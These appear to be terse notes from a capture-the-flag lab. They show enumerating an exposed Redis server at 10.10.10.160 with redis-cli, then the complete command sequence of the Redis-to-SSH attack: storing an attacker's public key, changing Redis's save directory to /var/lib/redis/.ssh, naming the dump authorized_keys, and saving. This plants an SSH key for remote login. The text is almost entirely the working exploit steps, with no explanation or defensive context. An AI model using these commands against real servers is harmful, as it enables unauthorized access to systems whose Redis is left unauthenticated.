sudo apt-get install redis-tools

http://antirez.com/news/96

redis-cli -h 10.10.10.160
10.10.10.160:6379> dbsize
(integer) 0
(0.51s)
10.10.10.160:6379> CONFIG GET databases
1) "databases"
2) "16"
(0.63s)
10.10.10.160:6379> INFO keyspace
# Keyspace
(0.56s)
10.10.10.160:6379> INFO



ssh-keygen -f redis
echo -ne "\n\n" > public; cat redis.pub >> public
redis-cli -h 10.10.10.160 SLAVEOF NO ONE
cat public | redis-cli -h 10.10.10.160 -x set pub
redis-cli -h 10.10.10.160 CONFIG SET dir /var/lib/redis/.ssh
redis-cli -h 10.10.10.160 CONFIG SET dbfilename authorized_keys
redis-cli -h 10.10.10.160 SAVE



